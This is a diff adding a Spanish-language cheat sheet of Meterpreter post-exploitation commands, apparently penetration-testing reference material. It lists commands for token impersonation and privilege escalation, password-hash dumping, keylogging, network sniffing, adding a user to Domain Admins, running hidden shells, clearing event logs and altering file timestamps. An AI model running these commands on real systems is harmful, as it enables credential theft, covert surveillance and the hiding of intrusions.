@@ -1,0 +1,45 @@
+Comandos de Meterpreter 
+
+​
+​run [script] ​Ejecuta un script de meterpreter
+​sysinfo​ ​Muestra la información del sistema comprometido
+​ls​ ​Muestra los ficheros y directorios del sistema comprometido
+​use priv ​Carga librerías para elevar privilegios
+​ps​ ​Muestra los procesos en ejecución
+​migrate PID ​Migra un proceso específico.
+​use incognito ​Carga las librerías de incógnito.
+​list_tokens -u ​Muestra los tokens disponibles por usuario
+​list_tokens -g ​Muestra los tokens disponibles por grupo
+​impersonate_token [dominio]\\[usuario] ​Apropiación de un token disponible del objetivo.
+Ejemplo: ​impersonate_token 'NT AUTHORITY\SYSTEM'
+​steal_token PID ​Apropiación de un token disponible de un proceso dado
+​drop_token ​Deja de usar el token actual
+​getsystem​ ​Intenta elevar los privilegios del usuario de acceso.
+​shell​ ​Ejecuta una Shell interactiva
+​execute -f cmd.exe -i ​Ejecuta cmd.exe e interactúa con él
+​execute -f cmd.exe -i -t ​Ejecuta cmd.exe con todos los tokens disponibles
+​execute -f cmd.exe -i -H -t ​Ejecuta cmd.exe con todos los tokens disponibles y lo convierte en un proceso oculto.
+​rev2self ​Retorna al usuario original que comprometió el sistema
+​reg [comando] ​Ejecuta comandos en el registro del sistema comprometido
+​setdesktop [número] ​Cambia de pantalla
+​screenshot​ ​Toma una captura de pantalla del objetivo
+​upload file ​Carga un fichero en el objetivo
+​download file ​Descarga un fichero del objetivo
+​keyscan_start ​Comienza el sniffing del teclado.
+​keyscan_dump ​Vuelca las teclas pulsadas del sistema objetivo.
+​keyscan_stop ​Para el sniffing del teclado.
+​getprivs​ ​Intenta elevar privilegios.
+​uictl enable keyboard/mouse ​Toma el control del teclado o ratón.
+​background​ ​Sale de meterpreter sin cerrar la sesión.
+​hashdump​ ​Obtiene todos los hashes del objetivo.
+​use sniffer ​Carga las librerías para esnifar.
+​sniffer_interfaces ​Lista los interfaces disponibles.
+​sniffer_dump [interfaceID] pcapname ​Comienza a esnifar un interfaz.
+​sniffer_start [interfaceID] packet-buffer ​Comienza a esnifar un rango específico.
+​sniffer_stats [interfaceID] ​Para obtener estadísticas de la interfaz.
+​sniffer_stop interfaceID ​Detiene el sniffer.
+​add_user [usuario] [contraseña] -h [ip] ​Añade un usuario en el sistema objetivo.
+​add_group_user "Domain Admins" [usuario] -h [ip] ​Añade un usuario al grupo de administradores en el sistema objetivo.
+​clearev​ ​Vacía el log de eventos del sistema comprometido
+​timestomp ​Cambia los atributos de un fichero.
+​reboot​ ​Reinicia el sistema
